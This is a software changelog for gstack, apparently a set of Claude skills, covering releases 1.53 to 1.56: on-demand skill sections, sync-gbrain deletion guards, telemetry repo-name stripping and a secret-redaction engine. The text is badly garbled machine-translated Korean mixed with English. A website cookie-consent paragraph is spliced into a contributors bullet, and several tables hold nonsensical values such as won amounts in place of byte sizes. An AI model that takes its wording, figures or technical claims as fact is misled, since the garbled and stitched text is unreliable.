가드가 실패합니다. 그 어떤 것은 디스크에 남아있을 수 없습니다 (다음 실행의 몇 초) 삭제보다. 즉, asymmetry는 디자인
- 누락된 감적기는 작은 일을 요할 수 있습니다, 당신의 자료.

### 너를 위한 이 뜻

`/sync-gbrain`를 사용한다면, 추락되거나 타임 아웃 가져오기는 no 더 긴 비용으로 작동을 중단할 수 있습니다. 이력서는 이제 항상 주장하는 것을 의미합니다. 그 시간이 오래 전에 시작 대신 남아있는 곳을 선택하는 큰 동기화 및 침묵으로 건너뛰는 대신 다시 시도하는 파일이 실패했습니다. 구성 할 수 없습니다. 업그레이드 및 동기화를 유지하십시오.

### 항목화 된 변경

#### 고정
- **`/sync-gbrain`는 `rm -rf` 당신의 repo 뿌리를 수 있었습니다.** 독재된 이력서 체크포인트
  (dir= repo, repo는 작업 디렉토리가 되었는 동안 수입이 중단되었을 때 쓰여진 경우, 재발적으로 삭제된 것으로 채택되었다. 단일 실패 닫힌 소유권 검사는 이제 모든 시효 삭제 및 모든 재발을 보호한다. 경로는 깨끗하게 해결해야 하며 `~/.gstack`라는 `.staging-ingest-*`의 직접적인 아이가 no `.git`를 포함하며, 마커 파일 gstack를 수행한다. (mejoy-rez)는 @gstack (mejoy-rez)가 거부한다.
- **리모트 http syncs no 더 긴 churn (또는 당신을 스카프).** 지속적 성적
  뇌 sync 푸시는 no 더 긴 시효를 통해 경로를 밟아서 모든 실행에 삭제되고 false "preventing data loss" 경고를 방출 중지합니다.
- **이제는 이제는 이제는 재시작합니다.** 이전 실행은 "checkpoint
  보존 된"하지만, 노후화 디디르를 삭제, 그래서 다음은 항상 휴식. 노후화 디디르는 지금 그것을 체크 포인트가 될 때 유지, 메시지는 아무 것도 재시작 할 때 솔직합니다.
- **no 더 긴 숨기는 수입 실패.** 재시작 실행은 파일들을 표시할 수 있었습니다.
  실수로 가져 오기 실패, 그래서 그들은 결코 재발하지 않았다. 실패는 이제 이력서에 소스 파일로 다시 맵을하고 다른 패스를 얻을.

#### 기여자
- 새로운 `lib/staging-guard.ts` 수출 `checkOwnedStagingDir()`, 단 하나
  이 웹 사이트는 귀하가 웹 사이트를 탐색하는 동안 귀하의 경험을 향상시키기 위해 쿠키를 사용합니다. 이 쿠키들 중에서 필요에 따라 분류 된 쿠키는 웹 사이트의 기본적인 기능을 수행하는 데 필수적이므로 브라우저에 저장됩니다. 또한이 웹 사이트의 사용 방식을 분석하고 이해하는 데 도움이되는 제 3 자 쿠키를 사용합니다. 이 쿠키는 귀하의 동의하에 만 브라우저에 저장됩니다. 이러한 쿠키를 거부 할 수도 있습니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다.

## [1.56.0.0] - 2026-06-03

## **5 무거운 기술이 지금 수요에 대량을로드, 공유 질문은 슬림 한 코푸 전체를 preamble, 파라노이드 테스트 스위트는 문제가 결코 더 악화되지 않습니다.**

토큰 감소 프로그램은 가장 큰 파도를 착륙합니다. 가장 큰 기술 중 다섯 - `/plan-ceo-review`, `/office-hours`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review` — 이제는 작은 항상 적재된 골격 플러스가 작동에 도달 할 때만 에이전트가 열립니다. 대화 형 전면 반 (Step 0 범위, 라이브 인터뷰)는 항상로드됩니다. 딥 검토 바디, 디자인 문서 템플릿, 외부 청구서 규칙, 그리고 필요한 출력 작가는 단일 STOP-읽기 뒤에 이동. 공유 AskUserQuestion preamble 또한 드문 - needed CJK escaping 설명서를 흘렸습니다, 그래서 모든 상호 작용하는 기술은 한 번에 작은 점화기입니다. 그리고 gstack에서 가장 사용자 직면 표면이 당신이 묻는 질문이기 때문에, 새로운 패러노이드 테스트 스위트는 결코 똑똑한 질문을 증명하지 않습니다.

### 중요 한 숫자

생성된 골격 (`wc -c <skill>/SKILL.md`)에서 측정, 모든 호스트에 대한 재생:

| 스킬 | 의 전 | 후지후 | Δ |
|-------|--------|-------|---|
| 플랜 일람 | 143,838 B· | 80,731 B,100 원 | -42.0% |
| 사무실 시간 | 1,280원 | 895,444 원 | -24.8% |
| 플랜 일람 | 106,984 B 조 | 892,892,400원 | -48.7% |
| 플랜트-디자인-리뷰 | 143,057 B· | 76,024 B,600 원 | -32.2% |
| 플랜-devex-review | 110,621 B,600 원 | 69,658 B,600 원 | -37.0% |

퍼스킬 카브의 상단에 공유 AskUserQuestion preamble은 원스 라인 규칙 + doc 포인터에 인라인 CJK 설명서를 떨어졌다, 트리밍 ~29,524 클랜 호스트 파푸 (각각각 대화 형 기술, ~900 B).

AskUserQuestion 증거, SDK 캡처 (`test/skill-e2e-auq-matrix.test.ts`)에 의해 측정:

| - 제품 | Result |
|-----------|--------|
| , 동일한 트리거 대 동사 | 7/7 형식, 물질 5 == 7/7 형식, 물질 5 (no 분해) |
| Matrix across 7 AUQ-heavy skills | 모든 7/7의 체재, 물질 4-5 |
| 동일한 방아쇠 3× (소비자) | 안정, 각 형식 요소는 각 실행 |
| AUQ 형식 spec 항상 로드 | 모든 골격에서 보장 (Layer 0) |

모든 리뷰는 패스에 동일한 패스를 실행합니다. 변경된 유일한 것은 작업이 시작되기 전에 상황에 앉아있는 것입니다.

### 너를 위한 이 뜻

이 기술은 가장 먼저 표시된 라이터를 실행: `/plan-ceo-review`는 ~42%를 더 작게, 다른 사람 25-49%를 열고, 그들은 pull 그들의 검토 몸에 도달 할 때만. 당신은 그들에 도달 할 때 리뷰 자체에 어떤 행동 변화도 알 수 없습니다; 그들은 전에 단면도를 실행합니다. 당신이 당신의 실제적인 일에 남아있는 컨텍스트 창의 더 많은 것을 얻을, 각 주장에 지불. 그리고 당신이 지금 질문에 대한 모든 기술은 보증을 수행, 테스트에 의해 시행: 결정적인 간략한 (plain-English ELI10, 실제적인 이유, 직업 및 cons, 말뚝으로 명시된 권고는) 즉시 어떤 질문 불을 상황에 있는 확률이 높습니다. 외부 주인 (codex, 공장, kiro, opencode)는 아직도 가득 차있는 인라인 기술을, 그래서 Claude를 쫓아 버리지 않습니다.

### 항목화 된 변경

#### 추가
- `plan-ceo-review/sections/review-sections.md` — 11 단면도 깊은 검토, 외부 음성 규칙, 필수 산출 등록, 완료 요약, 검토 보고 작가, 다음 단계 chaining 및 형태 빠른 참고, 뒤에 STOP- 수동태복 `manifest.json`를 가진 포인터.
- `office-hours/sections/design-and-handoff.md` - 5 단계 디자인 문서 템플릿 + 단계 6 계층 핸드 오프, STOP- 수동 `manifest.json`와 함께 포인터를 다시.
- `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`는 포스트 단계 0 STOP-읽기 후에 새겨진 `sections/review-sections.md`를 얻습니다.
- `docs/askuserquestion-cjk.md` - 전체 비ASCII / CJK escaping 합리적 + 일 예, 수요에 읽으십시오.
- `test/auq-format-always-loaded.test.ts` - 무료 per-PR 키스톤: 모든 상호 작용하는 기술은 항상 로드된 골격에 있는 가득 차있는 AskUserQuestion 체재 spec를, 단면도에서 결코 좌초하지 않아야 합니다. 51개의 케이스 플러스 부정적인 통제.
- `test/skill-e2e-auq-matrix.test.ts` - 각 AUQ-heavy 기술을 첫 번째 질문과 등급 (7/7 형식, 물질 >=4)에 드라이브.
- `test/skill-e2e-auq-verbose-vs-carved-ab.test.ts` - 새겨진 기술의 질문을 증명하는 것은 같은 방아쇠에 전 carve monolith의 보다는 더 나아지 않습니다.
- `test/skill-e2e-auq-consistency.test.ts` - 동일한 트리거 N 배팅, 실행 사이 흔들리는 모든 형식 요소에 실패.
- `test/codex-e2e-recommendation-substance.test.ts` — 등급 `/codex`의 살아있는 권고 물질.
- `test/skill-ceo-section-ordering.test.ts` - 문 층 정적 감시: 단계 0 후에 STOP 불, 검토 몸은 골격에서 absent, 보고 작가는 단면도에서 생활하고, 아무 검토 간결은 STOP의 밑에 앉습니다.
- `test/skill-e2e-plan-ceo-review-section-loading.test.ts` - 주기적인 backstop는 새겨진 단면도가 보고의 앞에 읽습니다.

#### 변경
- `/plan-ceo-review`, `/office-hours`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`는 Claude에 각 골격막 + 하나에 주문 단면도입니다; 대화 정면 (Step 0/phases 1-4.5)는 항상 적재됩니다; 외부 주인은 아직도 풀 인라인 기술 (no 동작 변화 Claude)를 받습니다.
- AskUserQuestion preamble 트리는 수술 규칙 + doc 포인터에 인라인 CJK 설명서를 트리거합니다. 항상 로드된 셀프 체크는 변경되지 않습니다.
- Parity, 크기 판결, 단면, gen-skill-docs 및 기술 유효성 검사는 모든 새겨진 기술을 지속적으로 대우합니다 (content + 크기 지면은 골격 + 단면도 조합에 대하여 뛰습니다; 골격수 수축은 항상 적재한 승리를 감시합니다).

#### 기여자
- `test/helpers/auq-sdk-capture.ts` - 재사용 가능한 SDK 캡처 엔진 : AUQ에 기술을 구동하고 동사 생성 된 텍스트를 정리합니다 (실제로 PTY mangles 계획 모드 질문), 연결에 강력한 등급 형식 + 권장 물질, 및 검색 섹션은 도구 사용 스트림에서 손실이 적습니다.
- `section-manifest-consistency`는 각 새겨진 기술을 자동적으로 발견합니다, 그래서 다음 새기는 순간 그것의 현물에 덮습니다.
- `/ship`와 `/plan-ceo-review` 섹션 로드 E2E 테스트는 실제 PTY 스크린 버퍼를 긁는 대신 `claude -p` 도구 사용 시내에서 단면도를 읽습니다, 그래서 믿을 수 있습니다 (PTY 경로는 침묵으로 몇몇 맨끝에서 아무것도 본) 및 설치된 기술을 mutating 없이 worktree carve에 대하여 hermetically 실행합니다.

## [1.55.1.0] - 2026-06-02

## **Telemetry는 이제 기록과 그 체류를 정확히 알려줍니다. 프로젝트-slug 돕기자는 모든 경로에 안전한 식별자를 쉘을 넣습니다.**

텔레메틱스에서 화면을 옵트인은 이제는 숙련된 기술명, 기간, 충돌, 안정적인 장치 ID, no 코드와 no 파일 경로와 함께, repo 이름은 로컬로 기록되어 모든 업로드 전에 스트립을 하였습니다. 후드 아래에, 각 기술이 프로젝트를 찾는 데 도움이되는 돕기(`gstack-slug`)는 `[a-zA-Z0-9._-]`로 출력을 `[a-zA-Z0-9._-]`로 필터링하여, 모든 경로를 포함한 캐시 값이 쉘을 식별하는 것을 의미합니다. 두 회귀 테스트는 두 행동을 모두 잠그기 때문에 조용히 뒤를 당길 수 없습니다.

### 그 사정에 대한 보증

이 릴리스의 테스트에 의해 시행되지 않습니다 (`bun test test/telemetry-repo-strip.test.ts test/gstack-slug-sanitize.test.ts`):

| - 제품 | 으로 핀 |
|-----------|-----------|
| repo 이름은 결코 기계를 떠나지 않습니다 ( 업로드하기 전에 스트레이트) | `telemetry-repo-strip.test.ts` - 바닥 + 생산자 커버리지 + 샘플 이벤트에 실제 스트립을 실행 |
| 탬퍼드 슬러그 캐시는 쉘 문자를 돕기 위해 넣지 않을 수 있습니다. | `gstack-slug-sanitize.test.ts` - 위생이 제거되면 실패 |
| 동의 복사는 실제로 코드가 무엇인지 일치 | `generate-telemetry-prompt.ts` (각 기술로 재생) |

Repo-identity 테스트는 세 가지 생산 분야 (`repo`, `_repo_slug`, `_branch`)을 다루며, 스트립을 얻게 하는 새로운 필드를 추가하므로 CI는 오히려 안전하게 배송합니다.

### 너를 위한 이 뜻

원격 측정 선택 화면은 실제로 무슨 일이 일어나는지 설명합니다. 그래서 정확한 정보 (또는 아닙니다)에서 선택 할 수 있습니다. 당신이 기계를 공유하거나 탬퍼 `~/.gstack` 캐시에 대해 걱정할 경우, 슬러그  헬퍼는 이제 쉘에 아무것도 통과하지 않고 안전한 식별자를 거부합니다. 아무것도 할 수 없습니다. - 모두 업그레이드에 자동으로 착륙합니다.

### 항목화 된 변경

#### 변경
- Telemetry 동의 복사는 이제 정확합니다: "No 코드 또는 파일 경로. repo 이름은 로컬로 기록되며 업로드 전에 벗겨집니다"(No 코드, 파일 경로 또는 repo 이름)

#### 고정
- `gstack-slug`는 각 경로에 `[a-zA-Z0-9._-]`에 출력을, 값을 읽는 것을 포함하여 그것의 on-disk 캐시, 그래서 `eval "$(gstack-slug)"`는 항상 일반 식별자를 받습니다. 탬퍼 캐시 파일은 또한 다음 쓰기에 치유됩니다.
- telemetry preamble은 JSON 라인을 구축하기 전에 repo 기본 이름을 지정하므로 예외적인 repo 디렉토리 이름은 로컬 분석 레코드를 변형시킬 수 없습니다.

#### 추가
- `test/telemetry-repo-strip.test.ts` — no repo/branch 정체성 분야가 업로드 배치에 도달한다는 것을 시행합니다 (floor + 생산자 표지 + 실제 스트립 행동).
- `test/gstack-slug-sanitize.test.ts` - 독된 진창 캐시를 깎아주는 회귀 시험은 포탄 metacharacters를 주사할 수 없습니다.

#### 기여자
- `scripts/resolvers/preamble/`; 모든 `SKILL.md` 파일과 배 황금은 그 해결사에서 재생되었습니다.

## [1.55.0.0] - 2026-05-30

## **`/sync-gbrain`는 no 더 긴 방아쇠가 당신의 repo를 삭제하는 것을 돕습니다. headed 브라우저는 충돌 반복을 멈추고, gbrain는 핀 23 버전 stale 대신 현재 방출을 설치합니다.**

gbrain는 autopilot daemon reclones 중간 주기 때 작동 나무를 rm-rf 할 수 있습니다. gbrain의 `sources remove` 및 `sync --strategy code`를 호출하는 데 사용되는 `/sync-gbrain`는 안전하듯이, 그래서 그것이 경주를 놓는 일 수 있었습니다. 지금 각 파괴적인 gbrain는 특징 탐지한 감시의 뒤에 앉습니다: 렉서터는 autopilot이 활성화되어 있기 때문에, 사용자가 관리한 소스를 제거할 수 없습니다. 저장 보호 (그것은 닫히지 못합니다), realpath로 경로를 canonicalizes 그래서 symlink는 gbrain의 자신의 복제를 삭제하지 않고, URL 관리 소스의 코드 산책 전에 명시된 `--allow-reclone`를 요구합니다. 동일한 파에서 발송: headed 브라우저의 자동 충돌 루프가 사라지고, 큰 뇌 메모리는 고정 30 분에서 죽일 중지, gbrain 설치 프로그램은 버전 바닥과 `doctor` 자체 테스트 뒤에 최신 릴리스에 냉동 v0.18.2 핀을 이동.

### 중요 한 숫자

diff 및 그 회귀 스위트에서 (`bun test test/gbrain-*.test.ts browse/test/restart-env.test.ts test/memory-ingest-timeout.test.ts`):

| Metric | 의 전 | 후지후 | Δ |
|--------|--------|-------|---|
| 파괴적인 gbrain ops 뒤에 감시 | 0 | 4 | +4 |
| gbrain / Windows에서 작동되는 뇌 동기화 스페인 | 0/8 | 8/8 | +8 |
| gbrain 버전 설치 | v0.18.2 (핀, ~23 뒤) | 최신 + 최소 버전 바닥 + 의사 게이트 | — |
| 메모리-ingest timeout | 하드코딩 30분 | 설정, 체크포인트는 timeout에 보존 | — |
| SKILL.md를 정의하여 YAML를 정의 | 부분 (colons broke Codex) | 모든 (주) | — |

대부분의 경우: `sources remove` 파일이 `~/.gbrain/clones/` 밖에 살던 소스에 `sources remove`를 호출하고 저장 보호되지 않는 것은 이제 진행 대신 거부할 수 없습니다. repo no를 더 이상 실행하는 경로는 무인합니다.

### 너를 위한 이 뜻

`/sync-gbrain`를 사용한다면, gbrain가 자체 루트 수정을 발송하기 전에 데이터 손실 레이스에서 보호됩니다. `gbrain autopilot`가 활성화된 동안 "Don't run `/sync-gbrain`는 이제 시행되지 않고, 조언하지 않고, 아무것도 입증되지 않는 것이 삭제됩니다. beacon-heavy 페이지 (분석, 라이브 확장)에 대한 헤더 QA는 no가 더 긴 충돌 루프, 새 창에 새 창에 놓습니다. `/sync-gbrain`는 현재 Chromium를 설치하거나, 현재 Chromium를 설치합니다. Codex와 OpenAI는 각 gstack 기술을 다시 적재할 수 있습니다.

### 항목화 된 변경

#### 추가
- `/sync-gbrain` 파괴적인 op 감시 (`lib/gbrain-guards.ts`): 다중 신호 자동 조종 탐지, 실패 닫히는 `sources remove`, realpath `remote_url` 전 flight 감사 및 `--allow-reclone` 문 전에 URL 관리된 코드 도보.
- 설치 시간 gbrain 게이트 (`bin/gstack-gbrain-install`) : 최소 버전 바닥과 `gbrain doctor --fast` 자체 테스트, 두 개의 경화 요법을 가지고 있습니다.
- `GSTACK_INGEST_TIMEOUT_MS` 메모리를 가장 많이 사용하는 타임아웃을 구성합니다. gbrain 체크포인트를 타임아웃하면 다음의 런타임을 유지하고 있습니다.

#### 변경
- gbrain는 default에 의해 최신 기본 브레이크 HEAD에 설치합니다; 재현성을 위해 `gstack-gbrain-install --pinned-commit <sha>`를 가진 commit를 핀으로 꼿습니다.
- SKILL.md 내부 식민지와 설명은 이제 인용되어 있으므로 엄격한 YAML 로더 (Codex/OpenAI)가 그들에 흠뻑 취합니다.
- `/sync-gbrain` 지도: autopilot 도중 달리지 마십시오; URL 관리한 근원에 `gbrain sources add --path`를 선호하십시오.

#### 고정
- `/sync-gbrain` no 더 긴 경주 gbrain의 파괴적인 reclone로 autopilot 또는 제거하십시오 (#1734). @mvanhorn에 의하여 보고하십시오.
- `gstack-jsonl-merge`는 기계의 맞은편에 동급회계 항목 deterministically를 해결하므로 re-conflicting forever 대신에 append-only 로그가 합쳐집니다. @jbetala7에 의해 기여합니다.
- SKILL.md frontmatter 파스를 엄격한 YAML 로더 (#1778)에 의해 생성해. @GilbertzzzZZ, @genisis0x, @cathrynlavery 및 @sator-imaging에 의해 보고해.
- headed 브라우저 daemon no는 하중, 누출 Chromium 과정, 또는 headed 세션을 headless (#1781)로 완전히 하향합니다.
- `/sync-gbrain --full` 큰 두뇌에 메모리 ingests는 no 더 긴 고정 된 30 분 타임 아웃에서 살해 (#1611).
- Windows (#1731)에서 gbrain CLI와 `gstack-brain-sync`의 간격을 정확하게 붙입니다.

#### 기여자
- `lib/gbrain-guards.ts` 각 감시 branch (autopilot 신호, 실패 닫히는 제거, reclone 문, realpath 포함)를 위한 신비한 시험과 더불어.
- `parseSourcesList`는 모든 독자 (#1576)의 `gbrain sources list --json` 모양 취급을 중앙화하고, 그 충돌이 v1.42.0.0에서 이미 조정되었던지 — 마지막으로 분기한 독자를 제거합니다.
- 정체되는 지프 삼각대 (`test/gbrain-spawn-windows-shell.test.ts`)는 CI gbrain spawn가 Windows 포탄 깃발을 떨어뜨릴 경우 실패합니다.
- 루트 수정에 대한 gbrain-side 요구 사항 (ungated reclone, `--keep-storage`, 협력 제거 - lease, 기능 명령, true ingest-resume, 통합 CI)은 gbrain repo에 추적됩니다.

## [1.54.0.0] - 2026-05-30

## **가장 큰 기술은 모든 세션을 세금을받습니다. /ship의 항상로드 된 비용은 59% 감소했으며 그 결과는 이제 단계가 필요할 때만로드됩니다.**

`/ship`는 167KB 벽이 전체에서 지불 한 모든 세션이 버전 또는 변경 로그 또는 none를 작성했는지 여부. 이제 69KB 결정 트리 스켈레톤 플러스 8 `sections/*.md` 파일이 요구됩니다. 긴 prose (테스트 실행, 적용 감사, 계획 완료, 검토 육군, Greptile 삼극, adversarial pass, the adversarial pass, the adversarial pass, the changelog, the texts that are the same points run the bodys only the call. 인라인 배시의 ~90 라인에 사용되는 버전 범 논리, 워크 플로우의 단일 최악의 재 범프 발군, 이제 테스트 `gstack-version-bump` CLI (classify / 쓰기 / 복구). 다른 호스트 (codex, 공장, kiro, opencode)는 전체 인라인 기술을 변경하지 않도록 Claude를 다시 움직여. 이 릴리스 개 식품 자체 : 당신이 읽는 버전은 <2 /ph>에 의해 범프되었다.

### 중요 한 숫자

생성된 기술 (`wc -c ship/SKILL.md`)과 새로운 섹션 파일에서 직접 측정, 모든 호스트에 대한 재생:

| Metric | 전 (v1.53) | 후 (v1.54) | Δ |
|--------|----------------|---------------|---|
| 배송 및 배송 | 167 KB (~41.8K 토큰) | 69 KB (~17.2K 토큰) | -59% |
| 배 prose는 달 당 적재했습니다 | 모두의 그것 | 적용 가능한 단면 | 주문하기 |
| 배 버전 논리 | ~90 라인 인라인 배쉬 | 시험된 CLI, 15 단위 시험 | extracted |
| 외부 호스트 배 | 167 KB 인라인 | 162 KB 인라인 (변경된 행동) | no 회귀 |

골격은 즉시 `/ship`를 적재하는 것은, 그래서 ~24.6K-token 하락은 매 단 하나 배에, 다만 한 번 지불됩니다.

### 너를 위한 이 뜻

`/ship` 실행은 ~3x 라이터를 시작하고 각 중력의 지시에 끌어 당기면 그 단계에 도달하면 에이전트가 아직 사용하지 않는 창 보유 중 덜 지출합니다. 작업 흐름은 단계와 동일하지 않습니다. 차이는 상황에 따라 다릅니다. 이식 단계에서 단계를 읽으려면 `~/.claude/skills/gstack/ship/sections/`에서 라이브 챕터가 있습니다.

### 항목화 된 변경

#### 추가
- `bin/gstack-version-bump` - 테스트된 버전 상태 CLI (classify/ 쓰기/수신) 15 단위 시험으로 가득 차있는 FRESH/ ALREADY_BUMPED/ DRIFT_STALE_PKG/DRIFT_UNEXPECTED 모체를 덮습니다.
- `ship/sections/*.md` — 8개의 주문형 섹션 (테스트, 테스트 coverage, 계획 컴파일, 검토 육군, Greptile, adversarial, changelog, pr-body) 수동 `manifest.json` 레지스트리.
- `gen-skill-docs`의 단면도 파이프라인: `{{SECTION:id}}` (STOP- 다른 호스트에 있는 Claude, 인라인에 독서 포인터)와 `{{SECTION_INDEX}}` (표면에서 렌더링되는 상황).
- `test/helpers/transcript-section-logger.ts` + `required-reads.ts` 및 섹션 로드 / 표시-소비자 / 상황에 대한 테스트가 캐러밴을 보호.

#### 변경
- `/ship`는 Claude에 골격 + 단면도입니다; 외부 주인은 아직도 풀 인라인 기술을 받습니다 (no 행동은 Claude를 끄.
- 단계 12 호출 `gstack-version-bump` 대신 인라인 bash.
- Parity 마구는 새겨진 기술을 이해합니다 (체크레톤 + 단면도 조합을 검사하십시오; skeleton 실제로 shrank를 주장합니다).

#### 기여자
- `setup` 링크 `sections/` 접두사 Claude + Kiro 기술 디너로 `--host all` 이제 호스트 실패에 대한 빌드가 실패하지 않습니다.
- `<skill>/sections/*.md.tmpl`; `bun run gen:skill-docs`로 재생하는 새로운 단면도 템플렛.
## [1.53.1.0] - 2026-05-30

## **작업 공간과 스크립트 설정은 다시 숨겨진 프롬프트에 걸리지 않습니다. 계획-tune Hooks 설치는 이제 안전한 기본으로 구동됩니다.**

`./setup`는 "지금 두 후크 모두에 대해 물었다? [y/N]" 블록 읽기. 도체 작업 공간 또는 어떤 운송 터미널에서 실행, 그 프롬프트는 아무도 대답하지 않았다, 그래서 영원히 걸었다. 이제 결정은 플래그에서 온다, env var, 또는 저장 구성, 아무도 대기의 안전한 default을 가지고 응답 할 때 아무도가. 실제 터미널은 여전히 프롬프트를 얻지만, 그것은 10-스프 라인이 될 수 없습니다 (자동).

### 너를 위한 이 뜻

- 새로운 작업 공간을 Spinning. `bin/dev-setup`는 완전히 비동기적으로 실행되며, 다시 뒤에 글로벌 Claude 설정을 다시 작성하지 않습니다.
- 프롬프트없이 설치 된 계획 타이 후크를 원하십니까? `./setup --plan-tune-hooks` (또는 `GSTACK_PLAN_TUNE_HOOKS=yes`, 또는 `gstack-config set plan_tune_hooks yes`). 그들을 원하지 않습니까? `--no-plan-tune-hooks`. 그것을 놓고 진짜 맨끝은 여전히 한 번 묻습니다. 그런 다음 기억하십시오.

### 추가

- `--plan-tune-hooks` / `--no-plan-tune-hooks` / `--plan-tune-hooks=yes|no|prompt` 플래그 `./setup`, `GSTACK_PLAN_TUNE_HOOKS` env var와 `plan_tune_hooks` 구성 키 (default `prompt`). 우선 : flag > env > 저장된 설정 > 실제 터미널에서 프롬프트.

### 고정

- `./setup` no 더 긴 비동기 또는 앞으로 TTY 컨덕터 (Conductor workspaces, CI)에 걸린다. 계획-tune 동의는 시간 경계와 기본으로 건너 뛰기 위하여.
- `bin/dev-setup`는 설정이 비동기적으로 실행되며 no는 더 이상 작동 공간이 삭제될 때 ephemeral workspace 경로에 할당하기 위해 글로벌 `~/.claude/settings.json`를 더 이상 식을 씁니다.
- `YES`, `Yes`, ` yes`와 같은 Opt-in 값은 끊임없이 건너뛰기 때문에, `gstack-config`는 이제 밖으로 지배합니다-of-domain `plan_tune_hooks` 값 대신 명예를 줍니다.

### 기여자

- 새로운 회귀 스위트 `test/setup-plan-tune-hooks-noninteractive.test.ts` (flag 배선, 차단 보행 감시, 결정 정상화, 설정 라운드 스트립 + 도메인 거부, dev-setup 핀) 호스트 구성 고립과 함께 온도 `GSTACK_HOME`.
- 스테이클 v1.44.1 앵커에서 v1.53.0.0로 `test/parity-suite.test.ts`를 재개했습니다. 1.05 per-skill 비율은 (분기 이동) 유지되며, 합법적인 v1.49–v1.53 계획-skill 성장을 흡수하고 v1.53.0.0 항목에 명시된 5 사전 노출 패성 실패를 명확하게합니다. V1→v2 감사 트레일에 대한 역사적인 기본 사항.
- De-flaked `test/plan-tune.test.ts` "derive pushes range_"(와스 ~25 ~ 50 %의 깃봉, 주중에 더 악) : 이제는 `GSTACK를 설정합니다._QUESTION_LOG_NO_DERIVE=1` so gstack-question-log's fire-and-forget background `--derive"는 테스트의 명시적인 것을 경주할 수 없습니다.

## [1.53.0.0] - 2026-05-29

## ** Secrets, PII, 그리고 법적인 landmines는 그들이 public 싱크에 도달하기 전에 붙잡습니다. 1개의 redaction 엔진은 지금 /spec, /ship, /cso, 그리고 /document-* 기술을 감시합니다. **

`/spec` used to scan for seven secret patterns and only blocked the codex hand-off. Everything after that — the GitHub issue it filed, the local archive — went out unscanned. So you could pull an AWS key out of the draft, re-run, and still publish a customer's email to a world-readable issue. That gap is closed. A single shared engine (`lib/redact-patterns.ts` + `lib/redact-engine.ts`, driven by the new `gstack-redact` CLI) now scans the exact bytes that will be sent, at every sink: 코드 디스패치, 문제 몸, 아카이브 쓰기, PR 몸과 제목, 그리고 그들이 커밋하기 전에 생성 된 문서. HIGH-confidence credentials 블록. PII 및 legal/damaging 내용 ("fired"로 묶인 이름 사람, 고객 "churn", NDA 마커) 를 찾기 당 당신을 신속, 이메일에 대 한 한 한 한 키 입력 자동 -redact, 전화, SSNs, 그리고 공상 카드. 개인 카드는 개인 카드보다 개인 카드.

그것은 가드 레일, vault가 아닙니다. `git push --no-verify`, 직접 `gh issue create`, 그리고 `GSTACK_REDACT_PREPUSH=skip`는 여전히 얻은. 그것은 사고와 걱정을 잡는다, 어디 실제 누출이에서 온.

### 중요 한 숫자

배송 엔진 및 테스트 스위트 (`bun test test/redact-*.test.ts` 및 per-skill 배선 테스트)에서 :

| Metric | 전 (v1.52) | (v1.53) 후 | Δ |
|--------|----------------|---------------|---|
| Redaction 패턴 | 7 (만) | 33 (초과 + PII + 법률 + 내부) | +26 |
| Tiers | 1 (블록) | 3 (블록 / 확인 / FYI) | +2 |
| /spec의 보강 싱크 | 1 (codex 전용) | 3 (codex, 문제, 아카이브) | +2 |
| 기술 지원 | 1 (/spec) | 5 (/spec, /ship, /cso, /document-release, /document-generate) | +4 |
| Redaction 테스트 | ~5개의 문자열 체크 | 159 행동 테스트 | +154 |

33 패턴의 계층 분할 : 17 HIGH (일반적으로 - 초상화), 14 MEDIUM (PII, 법적, 내부 - leak, 플러스 높 - FP 압흔 모양), 2 LOW. 구경측정은 포인트입니다 : 줄무늬 출판 가능한 키, Google `AIza` 키, JWTs 및 env-style `*_KEY=` 앉아 MEDIUM, 늑대 />, 늑대 / 8 늑대가없는 문이 늑대를 갖는 것입니다.

### 너를 위한 이 뜻

When you `/spec` or `/ship`, you no longer have to remember that the issue body is public. A real credential stops the operation cold and tells you to rotate it. An email or a sentence naming a coworker surfaces as a question, with auto-redact one keystroke away. Turn on the optional pre-push hook (`gstack-config set redact_prepush_hook true`) to catch the classic `.env`-into-the-diff push too. Nothing new to learn: it runs inside the skills you already use.

### 항목화 된 변경

#### 추가
- **공유 redaction 엔진.** `lib/redact-patterns.ts` (33-pattern, 3-tier taxonomy — 진실의 단 하나 근원)와 `lib/redact-engine.ts` (순수 `scan()` + `applyRedactions()`를 가진 유니코드 정상적인화, ReDoS-safe 크기 모자, Luhn/entropy/RFC1918 validators, 안전한 가면 시사).
- **`gstack-redact` CLI** - stdin 또는 파일, JSON 또는 인간 산출, 출구 0/2/3 문 기술에, `--auto-redact`를 위한 PII를 위한 `--repo-visibility`, `--allowlist`, `--self-email`를 검사하십시오.
- **Opt에서 전진 후크** (`gstack-redact-prepush` + `gstack-redact install-prepush-hook`) - diff (public 및 개인)의 압흔을 막고 `remote..local` diff 방향을 new-branch/force-push/delete 취급하고, 어떤 기존의 걸이, `GSTACK_REDACT_PREPUSH=skip` 탈출 벨브든지 사슬을 사슬을 붙입니다.
- **`/spec` 4.5a 세만 검토** - 인-통역 패스 (no 제3자) 명명-범성, 고객 불만, 비언트 전략, NDA 재료, 그리고 `~/.gstack/security/semantic-reviews.jsonl`의 콘텐츠없는 감사 트레일과 함께, 밝힌 코드명.
- **Config 열쇠** `redact_repo_visibility` (local-only는 `gh`/`glab`를 위해 읽을 수 없습니다)와 `redact_prepush_hook`를 겹쳐 쌓입니다.

#### 변경
- **`/spec`, `/ship`, `/document-release`, `/document-generate`**는 각 외부 수채에, 정확한 바이트에 (temp 파일 검사에 잉크, no 검사 그 후에 제거 간격)를 검사합니다. `/ship`는 도구에 의하여 자극되는 담에서 Codex/Greptile 산출을 포장합니다 그래서 예를 들면 그 도구는 PR 실패 대신 비 막는 경고에 degrade를 주의합니다.
- **`/cso`**는 `lib/redact-patterns.ts`를 통해 동일한 공세를 공유합니다.

#### 기여자
- 적색 표면의 기술 문서는 `scripts/resolvers/redact-doc.ts` (`{{REDACT_TAXONOMY_TABLE}}`, `{{REDACT_INVOCATION_BLOCK:<sink>}}`)에서 생성되므로 엔진에서 5 가지 기술이 결코 무해합니다.
- 12 새로운 테스트 파일, 159의 redaction assertions, 및 주기적인 층 semantic 통행 eval (`test/redact-semantic-pass.eval.ts`).
